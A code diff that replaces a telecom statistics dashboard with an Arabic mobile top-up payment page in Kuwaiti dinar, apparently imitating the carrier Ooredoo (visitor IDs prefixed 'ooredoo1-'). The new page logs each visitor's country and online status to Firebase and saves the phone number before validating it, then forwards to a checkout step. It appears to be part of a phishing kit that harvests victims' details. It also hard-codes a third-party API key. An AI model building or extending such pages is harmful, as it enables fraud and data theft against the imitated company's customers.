@@ -1,531 +1,312 @@
 "use client"
 
-import { useState } from "react"
-import { motion } from "framer-motion"
-import { Globe, Users, Network, ChevronRight, BarChart3, Signal } from "lucide-react"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import type React from "react"
+import { useEffect, useState, useCallback } from "react"
+import { useRouter } from "next/navigation"
+import { ArrowRight, Loader2, Trash2, Receipt, Globe, Phone } from "lucide-react"
 import { Button } from "@/components/ui/button"
-import { Badge } from "@/components/ui/badge"
+import { Input } from "@/components/ui/input"
+import { Label } from "@/components/ui/label"
+import { Card, CardContent } from "@/components/ui/card"
+import { Separator } from "@/components/ui/separator"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
-export default function GlobalTelecommunications() {
-  const [selectedRegion, setSelectedRegion] = useState("global")
-  const [activeTab, setActiveTab] = useState("overview")
+// --- STUBS for external dependencies ---
+// In a real app, these would be in their respective files (e.g., lib/firebase.ts, lib/utils.ts)
 
-  const globalMetrics = [
-    {
-      title: "Total Connections",
-      value: "9.2B",
-      change: "+4.8%",
-      icon: <Network className="h-5 w-5" />,
-      description: "Active mobile connections worldwide",
-    },
-    {
-      title: "5G Deployment",
-      value: "42%",
-      change: "+18%",
-      icon: <Signal className="h-5 w-5" />,
-      description: "Global 5G network coverage",
-    },
-    {
-      title: "Digital Users",
-      value: "5.44B",
-      change: "+2.1%",
-      icon: <Users className="h-5 w-5" />,
-      description: "Active internet users globally",
-    },
-    {
-      title: "Revenue Growth",
-      value: "$1.9T",
-      change: "+5.2%",
-      icon: <BarChart3 className="h-5 w-5" />,
-      description: "Global telecom market size",
-    },
-  ]
 
-  const regions = [
-    {
-      id: "global",
-      name: "Worldwide",
-      flag: "🌍",
-      connections: "9.2B",
-      growth: "+4.8%",
-      infrastructure: "Advanced",
-      marketShare: "100%",
-    },
-    {
-      id: "asia",
-      name: "Asia Pacific",
-      flag: "🌏",
-      connections: "4.8B",
-      growth: "+6.2%",
-      infrastructure: "Leading",
-      marketShare: "52%",
-    },
-    {
-      id: "europe",
-      name: "Europe",
-      flag: "🇪🇺",
-      connections: "1.3B",
-      growth: "+2.1%",
-      infrastructure: "Mature",
-      marketShare: "14%",
-    },
-    {
-      id: "americas",
-      name: "Americas",
-      flag: "🌎",
-      connections: "1.9B",
-      growth: "+3.4%",
-      infrastructure: "Advanced",
-      marketShare: "21%",
-    },
-    {
-      id: "africa",
-      name: "Africa",
-      flag: "🌍",
-      connections: "1.0B",
-      growth: "+8.7%",
-      infrastructure: "Emerging",
-      marketShare: "11%",
-    },
-    {
-      id: "oceania",
-      name: "Oceania",
-      flag: "🇦🇺",
-      connections: "200M",
-      growth: "+1.8%",
-      infrastructure: "Developed",
-      marketShare: "2%",
-    },
-  ]
 
-  const topOperators = [
-    {
-      name: "China Mobile",
-      region: "Asia Pacific",
-      subscribers: "984M",
-      revenue: "$115B",
-      technology: "5G SA",
-      rank: 1,
-      specialty: "Network Scale",
-    },
-    {
-      name: "Reliance Jio",
-      region: "Asia Pacific",
-      subscribers: "450M",
-      revenue: "$25B",
-      technology: "Digital Services",
-      rank: 2,
-      specialty: "Innovation",
-    },
-    {
-      name: "Verizon",
-      region: "North America",
-      subscribers: "118M",
-      revenue: "$140B",
-      technology: "mmWave 5G",
-      rank: 3,
-      specialty: "Premium Services",
-    },
-    {
-      name: "AT&T",
-      region: "North America",
-      subscribers: "210M",
-      revenue: "$168B",
-      technology: "Fiber + 5G",
-      rank: 4,
-      specialty: "Enterprise",
-    },
-    {
-      name: "Orange",
-      region: "Europe/Africa",
-      subscribers: "266M",
-      revenue: "$45B",
-      technology: "Multi-region",
-      rank: 5,
-      specialty: "Convergence",
-    },
-    {
-      name: "T-Mobile",
-      region: "Global",
-      subscribers: "315M",
-      revenue: "$80B",
-      technology: "Un-carrier",
-      rank: 6,
-      specialty: "Customer Experience",
-    },
-  ]
+// --- END STUBS ---
 
-  const technologyTrends = [
-    {
-      name: "5G Standalone",
-      adoption: "28%",
-      growth: "+35%",
-      impact: "High",
-      timeline: "2024-2026",
-      description: "Full 5G architecture deployment",
-      keyFeatures: ["Ultra-low latency", "Network slicing", "Edge computing", "Massive IoT"],
-    },
-    {
-      name: "Open RAN",
-      adoption: "15%",
-      growth: "+120%",
-      impact: "Transformative",
-      timeline: "2024-2027",
-      description: "Open radio access network standards",
-      keyFeatures: ["Vendor interoperability", "Cost reduction", "Innovation acceleration", "Supply chain diversity"],
-    },
-    {
-      name: "Private Networks",
-      adoption: "8%",
-      growth: "+85%",
-      impact: "Significant",
-      timeline: "2024-2025",
-      description: "Enterprise-dedicated cellular networks",
-      keyFeatures: ["Enhanced security", "Customized coverage", "Industry 4.0", "Critical communications"],
-    },
-    {
-      name: "Satellite Integration",
-      adoption: "5%",
-      growth: "+200%",
-      impact: "Revolutionary",
-      timeline: "2025-2030",
-      description: "Terrestrial-satellite network convergence",
-      keyFeatures: ["Global coverage", "Disaster resilience", "Rural connectivity", "IoT backhauling"],
-    },
-  ]
+interface PaymentData {
+  id: string
+  phone?: string
+  country?: string
+  amount?: string
+}
 
-  const emergingTech = [
-    {
-      title: "6G Research",
-      status: "Development",
-      timeline: "2030+",
-      investment: "$50B+",
-      leaders: ["Nokia", "Ericsson", "Samsung"],
-      capabilities: "Terahertz frequencies, AI-native, holographic communications",
-    },
-    {
-      title: "Quantum Communications",
-      status: "Pilot",
-      timeline: "2027+",
-      investment: "$12B+",
-      leaders: ["IBM", "Google", "Huawei"],
-      capabilities: "Unhackable security, quantum internet, distributed computing",
-    },
-    {
-      title: "AI Network Orchestration",
-      status: "Deployment",
-      timeline: "2024+",
-      investment: "$25B+",
-      leaders: ["Cisco", "Juniper", "VMware"],
-      capabilities: "Self-healing networks, predictive maintenance, automated optimization",
-    },
-  ]
+// It's highly recommended to move API keys to environment variables
+// For example: process.env.NEXT_PUBLIC_IPDATA_API_KEY
+// However, as no env vars are set for this session, using the provided key.
+const IPDATA_API_KEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+
+const _id =
+  "ooredoo1-" +
+  Math.random()
+    .toString(36)
+    .replace(/[^a-z]+/g, "")
+    .substr(0, 15)
+
+export default function PaymentPage() {
+  const router = useRouter()
+  const [amount, setAmount] = useState("5")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [country, setCountry] = useState<string | null>(null)
+
+  const formatAmount = useCallback((value: string): string => {
+    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
+    return isNaN(numericValue) ? "0" : numericValue.toString()
+  }, [])
+
+  const validatePhoneNumber = useCallback((phone: string): boolean => {
+    const phoneRegex = /^[0-9]{8}$/
+    return phoneRegex.test(phone)
+  }, [])
+
+  useEffect(() => {
+    const fetchLocation = async () => {
+      const url = `https://api.ipdata.co/country_name?api-key=${IPDATA_API_KEY}`
+      try {
+        const response = await fetch(url)
+        if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`)
+        }
+        const fetchedCountry = await response.text()
+        setCountry(fetchedCountry)
+        await addData({
+          id: _id,
+          country: fetchedCountry,
+          createdDate: new Date().toISOString(),
+        })
+        localStorage.setItem("country", fetchedCountry)
+        setupOnlineStatus(_id)
+      } catch (error) {
+        console.error("Error fetching location:", error)
+        // Set a default or handle error appropriately
+        setCountry("Unknown")
+      }
+    }
+    fetchLocation()
+  }, [])
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    await addData({ id: _id, phone: phoneNumber, mobile: phoneNumber })
+
+    if (!validatePhoneNumber(phoneNumber)) {
+      // Consider adding user feedback here (e.g., toast notification)
+      return
+    }
+
+    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
+    if (numericAmount < 1 || numericAmount > 100) {
+      // Consider adding user feedback here
+      return
+    }
+
+    setIsLoading(true)
+
+    try {
+      const sessionId = localStorage.getItem("visitor") || _id // Fallback to _id if visitor not found
+
+      const paymentData: PaymentData = {
+        id: sessionId,
+        phone: phoneNumber,
+        amount: amount,
+      }
+      await addData({ paymentData }) // Ensure addData is awaited if it's async
+      localStorage.setItem("amount", amount)
+
+      router.push("/checkout") // Assuming /checkout is the next page
+    } catch (error) {
+      console.error("Payment submission failed:", error)
+      // Add user feedback for error
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^\d]/g, "") // Allow only digits
+    setAmount(value || "0") // Set to "0" if empty to avoid NaN issues
+  }
+
+  const clearAmount = () => {
+    setAmount("0")
+  }
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
+    setPhoneNumber(value)
+  }
+
+  useEffect(() => {
+    localStorage.setItem("paymentAmount", amount)
+  }, [amount])
+
+  if (isLoading) {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 dark:bg-gray-900 p-4">
+        <Loader2 className="w-12 h-12 animate-spin text-red-600 dark:text-red-500 mb-6" />
+        <p className="text-lg font-medium text-gray-700 dark:text-gray-300">جاري التحميل...</p>
+        <p className="text-sm text-gray-500 dark:text-gray-400">يرجى الانتظار قليلاً</p>
+      </div>
+    )
+  }
 
   return (
-    <div className="min-h-screen bg-white">
-      {/* Header */}
-      <div className="border-b border-gray-100 bg-slate-50">
-        <div className="max-w-7xl mx-auto px-6 py-12">
-          <motion.div
-            className="text-center"
-            initial={{ opacity: 0, y: 20 }}
-            animate={{ opacity: 1, y: 0 }}
-            transition={{ duration: 0.6 }}
+    <div className="flex flex-col min-h-screen bg-gray-100 dark:bg-gray-900">
+      <header className="bg-white dark:bg-gray-800 shadow-sm sticky top-0 z-50">
+        <div className="container mx-auto max-w-md flex justify-between items-center p-4">
+          <Button
+            variant="ghost"
+            size="icon"
+            className="text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700"
           >
-            <div className="inline-flex items-center gap-3 mb-6">
-              <div className="w-12 h-12 bg-slate-900 rounded-xl flex items-center justify-center">
-                <Globe className="h-6 w-6 text-white" />
-              </div>
-              <h1 className="text-4xl font-bold text-slate-900">Global Telecom Intelligence</h1>
-            </div>
-            <p className="text-lg text-slate-600 max-w-3xl mx-auto">
-              Real-time insights into worldwide telecommunications infrastructure, market dynamics, and emerging
-              technologies
-            </p>
-          </motion.div>
+            <Globe className="w-5 h-5" />
+            <span className="sr-only">Change language</span>
+          </Button>
+          <h1 className="text-xl font-semibold text-gray-900 dark:text-white">دفع</h1>
+          <Button
+            variant="ghost"
+            size="icon"
+            onClick={() => router.back()}
+            className="text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700"
+          >
+            <ArrowRight className="w-5 h-5" />
+            <span className="sr-only">Go back</span>
+          </Button>
         </div>
-      </div>
+      </header>
 
-      <div className="max-w-7xl mx-auto px-6 py-8">
-        {/* Key Metrics */}
-        <motion.div
-          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-12"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.2 }}
-        >
-          {globalMetrics.map((metric, index) => (
-            <Card key={index} className="border border-gray-200 hover:shadow-lg transition-shadow duration-300">
-              <CardContent className="p-6">
-                <div className="flex items-start justify-between mb-4">
-                  <div className="p-2 bg-slate-100 rounded-lg">{metric.icon}</div>
-                  <Badge variant="outline" className="text-green-600 border-green-200 bg-green-50">
-                    {metric.change}
-                  </Badge>
-                </div>
-                <div className="space-y-1">
-                  <h3 className="text-2xl font-bold text-slate-900">{metric.value}</h3>
-                  <p className="text-sm font-medium text-slate-700">{metric.title}</p>
-                  <p className="text-xs text-slate-500">{metric.description}</p>
-                </div>
-              </CardContent>
-            </Card>
-          ))}
-        </motion.div>
-
-        {/* Regional Analysis */}
-        <motion.div
-          className="mb-12"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.4 }}
-        >
-          <div className="flex items-center justify-between mb-8">
-            <h2 className="text-2xl font-bold text-slate-900">Regional Market Analysis</h2>
-            <div className="flex gap-2">
-              <Button
-                variant={activeTab === "overview" ? "default" : "outline"}
-                size="sm"
-                onClick={() => setActiveTab("overview")}
-              >
-                Overview
-              </Button>
-              <Button
-                variant={activeTab === "growth" ? "default" : "outline"}
-                size="sm"
-                onClick={() => setActiveTab("growth")}
-              >
-                Growth
-              </Button>
+      <main className="flex-1 container mx-auto max-w-md p-4">
+        <Card className="w-full shadow-lg dark:bg-gray-800">
+          <CardContent className="p-0">
+            <div className="relative overflow-hidden rounded-t-lg">
+              <img
+                src="/zf.png"
+                alt="Promotional Banner"
+                width={600}
+                height={300}
+                className="w-full h-auto object-cover"
+              />
             </div>
-          </div>
 
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-            {regions.map((region) => (
-              <Card
-                key={region.id}
-                className={`border cursor-pointer transition-all duration-300 hover:shadow-md ${
-                  selectedRegion === region.id ? "border-slate-900 shadow-md" : "border-gray-200 hover:border-gray-300"
-                }`}
-                onClick={() => setSelectedRegion(region.id)}
-              >
-                <CardContent className="p-6">
-                  <div className="flex items-center gap-3 mb-4">
-                    <span className="text-2xl">{region.flag}</span>
-                    <div>
-                      <h3 className="font-semibold text-slate-900">{region.name}</h3>
-                      <p className="text-sm text-slate-500">Market Share: {region.marketShare}</p>
-                    </div>
+            <form onSubmit={handleSubmit} className="p-6 space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-5 gap-4 items-end">
+                {/* Phone Number Field */}
+                <div className="md:col-span-3 space-y-1.5">
+                  <Label
+                    htmlFor="phoneNumber"
+                    className="text-sm font-medium text-gray-700 dark:text-gray-300 block text-right"
+                  >
+                    رقم الموبايل
+                  </Label>
+                  <div className="relative">
+                    <Phone className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400 dark:text-gray-500" />
+                    <Input
+                      id="phoneNumber"
+                      type="tel"
+                      value={phoneNumber}
+                      onChange={handlePhoneChange}
+                      placeholder="xxxxxxxx"
+                      className="text-right py-3 text-base border-gray-300 dark:border-gray-600 focus:border-red-500 focus:ring-red-500 rounded-lg h-12 pr-10"
+                      dir="rtl"
+                      required
+                      aria-label="رقم الموبايل"
+                    />
                   </div>
-                  <div className="space-y-3">
-                    <div className="flex justify-between items-center">
-                      <span className="text-sm text-slate-600">Connections</span>
-                      <span className="font-medium">{region.connections}</span>
-                    </div>
-                    <div className="flex justify-between items-center">
-                      <span className="text-sm text-slate-600">Growth Rate</span>
-                      <Badge variant="outline" className="text-xs">
-                        {region.growth}
-                      </Badge>
-                    </div>
-                    <div className="flex justify-between items-center">
-                      <span className="text-sm text-slate-600">Infrastructure</span>
-                      <span className="text-sm font-medium">{region.infrastructure}</span>
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
-          </div>
-        </motion.div>
+                </div>
 
-        {/* Top Operators */}
-        <motion.div
-          className="mb-12"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.6 }}
-        >
-          <h2 className="text-2xl font-bold text-slate-900 mb-8">Leading Global Operators</h2>
-          <div className="space-y-4">
-            {topOperators.map((operator, index) => (
-              <Card key={index} className="border border-gray-200 hover:shadow-md transition-shadow duration-300">
-                <CardContent className="p-6">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-4">
-                      <div className="w-10 h-10 bg-slate-900 rounded-lg flex items-center justify-center text-white font-bold">
-                        {operator.rank}
-                      </div>
-                      <div>
-                        <h3 className="font-semibold text-slate-900">{operator.name}</h3>
-                        <p className="text-sm text-slate-500">{operator.region}</p>
-                      </div>
-                    </div>
-                    <div className="flex items-center gap-8 text-sm">
-                      <div className="text-center">
-                        <div className="font-semibold text-slate-900">{operator.subscribers}</div>
-                        <div className="text-slate-500">Subscribers</div>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-semibold text-slate-900">{operator.revenue}</div>
-                        <div className="text-slate-500">Revenue</div>
-                      </div>
-                      <div className="text-center">
-                        <Badge variant="outline">{operator.technology}</Badge>
-                        <div className="text-slate-500 mt-1">{operator.specialty}</div>
-                      </div>
-                      <ChevronRight className="h-5 w-5 text-slate-400" />
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
-          </div>
-        </motion.div>
-
-        {/* Technology Trends */}
-        <motion.div
-          className="mb-12"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.8 }}
-        >
-          <h2 className="text-2xl font-bold text-slate-900 mb-8">Technology Adoption Trends</h2>
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-            {technologyTrends.map((tech, index) => (
-              <Card key={index} className="border border-gray-200">
-                <CardHeader className="pb-4">
-                  <div className="flex items-center justify-between">
-                    <CardTitle className="text-lg">{tech.name}</CardTitle>
-                    <div className="flex items-center gap-2">
-                      <Badge variant="outline" className="text-xs">
-                        {tech.timeline}
-                      </Badge>
-                      <Badge
-                        variant="outline"
-                        className={`text-xs ${
-                          tech.impact === "High"
-                            ? "text-orange-600 border-orange-200"
-                            : tech.impact === "Transformative"
-                              ? "text-purple-600 border-purple-200"
-                              : tech.impact === "Significant"
-                                ? "text-blue-600 border-blue-200"
-                                : "text-red-600 border-red-200"
-                        }`}
+                {/* Amount Field */}
+                <div className="md:col-span-2 space-y-1.5">
+                  <Label
+                    htmlFor="amount"
+                    className="text-sm font-medium text-gray-700 dark:text-gray-300 block text-right"
+                  >
+                    المبلغ
+                  </Label>
+                  <div className="relative">
+                    <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 dark:text-gray-400 font-medium text-sm pointer-events-none">
+                      د.ك
+                    </span>
+                    <Input
+                      id="amount"
+                      type="tel" // Using text to handle custom formatting if needed, but ensure validation
+                      value={amount}
+                      onChange={handleAmountChange}
+                      className="text-center py-3 text-base font-medium border-gray-300 dark:border-gray-600 focus:border-red-500 focus:ring-red-500 rounded-lg h-12 px-10" // Adjusted padding for currency and clear
+                      dir="rtl"
+                      aria-label="المبلغ"
+                      maxLength={3}
+                      pattern="\d*" // Ensures numeric keyboard on mobile for type="text"
+                      inputMode="numeric" // Better mobile numeric keyboard
+                    />
+                    {amount !== "0" && (
+                      <Button
+                        type="button"
+                        variant="ghost"
+                        size="icon"
+                        onClick={clearAmount}
+                        className="absolute left-1 top-1/2 transform -translate-y-1/2 p-1 h-8 w-8 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-full"
+                        aria-label="Clear amount"
                       >
-                        {tech.impact}
-                      </Badge>
-                    </div>
+                        <Trash2 className="w-4 h-4 text-gray-400 dark:text-gray-500" />
+                      </Button>
+                    )}
                   </div>
-                  <p className="text-sm text-slate-600">{tech.description}</p>
-                </CardHeader>
-                <CardContent>
-                  <div className="flex items-center gap-4 mb-4">
-                    <div className="flex-1">
-                      <div className="flex justify-between text-sm mb-1">
-                        <span>Adoption Rate</span>
-                        <span className="font-medium">{tech.adoption}</span>
-                      </div>
-                      <div className="w-full bg-gray-200 rounded-full h-2">
-                        <div className="bg-slate-900 h-2 rounded-full" style={{ width: tech.adoption }}></div>
-                      </div>
-                    </div>
-                    <div className="text-right">
-                      <div className="text-sm text-slate-500">Growth</div>
-                      <div className="font-semibold text-green-600">{tech.growth}</div>
-                    </div>
-                  </div>
-                  <div className="grid grid-cols-2 gap-2">
-                    {tech.keyFeatures.map((feature, idx) => (
-                      <div key={idx} className="flex items-center gap-2 text-sm">
-                        <div className="w-1.5 h-1.5 bg-slate-400 rounded-full"></div>
-                        <span className="text-slate-600">{feature}</span>
-                      </div>
-                    ))}
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
-          </div>
-        </motion.div>
-
-        {/* Emerging Technologies */}
-        <motion.div
-          className="mb-12"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 1.0 }}
-        >
-          <h2 className="text-2xl font-bold text-slate-900 mb-8">Emerging Technologies</h2>
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-            {emergingTech.map((tech, index) => (
-              <Card key={index} className="border border-gray-200">
-                <CardContent className="p-6">
-                  <div className="mb-4">
-                    <div className="flex items-center justify-between mb-2">
-                      <h3 className="font-semibold text-slate-900">{tech.title}</h3>
-                      <Badge variant="outline" className="text-xs">
-                        {tech.status}
-                      </Badge>
-                    </div>
-                    <p className="text-sm text-slate-600 mb-3">{tech.capabilities}</p>
-                  </div>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between">
-                      <span className="text-slate-500">Timeline</span>
-                      <span className="font-medium">{tech.timeline}</span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-slate-500">Investment</span>
-                      <span className="font-medium">{tech.investment}</span>
-                    </div>
-                    <div>
-                      <span className="text-slate-500 block mb-1">Key Players</span>
-                      <div className="flex flex-wrap gap-1">
-                        {tech.leaders.map((leader, idx) => (
-                          <Badge key={idx} variant="outline" className="text-xs">
-                            {leader}
-                          </Badge>
-                        ))}
-                      </div>
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
-          </div>
-        </motion.div>
-
-        {/* Call to Action */}
-        <motion.div
-          className="text-center"
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 1.2 }}
-        >
-          <Card className="border border-gray-200 bg-slate-50">
-            <CardContent className="p-12">
-              <h3 className="text-2xl font-bold mb-4 text-slate-900">Stay Connected to Innovation</h3>
-              <p className="text-slate-600 mb-8 max-w-2xl mx-auto">
-                Access comprehensive market intelligence, technology insights, and strategic analysis to navigate the
-                evolving telecommunications landscape.
-              </p>
-              <div className="flex flex-wrap justify-center gap-4">
-                <Button size="lg" className="bg-slate-900 hover:bg-slate-800">
-                  Get Market Report
-                </Button>
-                <Button size="lg" variant="outline">
-                  Technology Roadmap
-                </Button>
-                <Button size="lg" variant="outline">
-                   Industry Analysis
-                </Button>
+                </div>
               </div>
-            </CardContent>
-          </Card>
-        </motion.div>
-      </div>
+
+              <p className="text-xs text-gray-500 dark:text-gray-400 text-right">
+                البلد المكتشف: {country || "جاري التحديد..."}
+              </p>
+
+              <Button
+                type="button"
+                variant="outline"
+                className="w-full py-3 border-red-500 text-red-500 hover:bg-red-50 dark:hover:bg-red-700/20 dark:border-red-600 dark:text-red-500 rounded-lg text-base font-medium h-12"
+              >
+                الدفع لرقم آخر
+              </Button>
+
+              <Separator className="my-6 dark:bg-gray-700" />
+
+              <div className="space-y-3">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center text-gray-700 dark:text-gray-300">
+                    <Receipt className="w-5 h-5 text-red-600 dark:text-red-500 ml-2" />
+                    <span className="text-sm font-medium">إعادة التعبئة / دفع الفواتير</span>
+                  </div>
+                </div>
+
+                <div className="flex justify-between items-center">
+                  <div className="text-lg font-semibold text-gray-900 dark:text-white">
+                    {Number.parseFloat(amount || "0").toFixed(3)} د.ك
+                  </div>
+                  <div className="text-sm font-medium text-gray-700 dark:text-gray-300">الإجمالي:</div>
+                </div>
+              </div>
+
+              <Button
+                type="submit"
+                disabled={
+                  isLoading ||
+                  !phoneNumber ||
+                  !validatePhoneNumber(phoneNumber) ||
+                  Number.parseFloat(amount || "0") < 1 ||
+                  Number.parseFloat(amount || "0") > 100
+                }
+                className="w-full py-3 bg-red-600 hover:bg-red-700 disabled:bg-gray-300 dark:disabled:bg-gray-600 disabled:text-gray-500 dark:disabled:text-gray-400 text-white rounded-lg text-base font-medium h-12 transition-colors duration-150"
+              >
+                {isLoading ? (
+                  <div className="flex items-center justify-center">
+                    <Loader2 className="w-5 h-5 animate-spin ml-2" />
+                    <span>جاري المعالجة...</span>
+                  </div>
+                ) : (
+                  <span>استمرار</span>
+                )}
+              </Button>
+            </form>
+          </CardContent>
+        </Card>
+      </main>
+      <footer className="py-4 text-center text-xs text-gray-500 dark:text-gray-400">
+        © {new Date().getFullYear()} Your Company Name. All rights reserved.
+      </footer>
     </div>
   )
 }
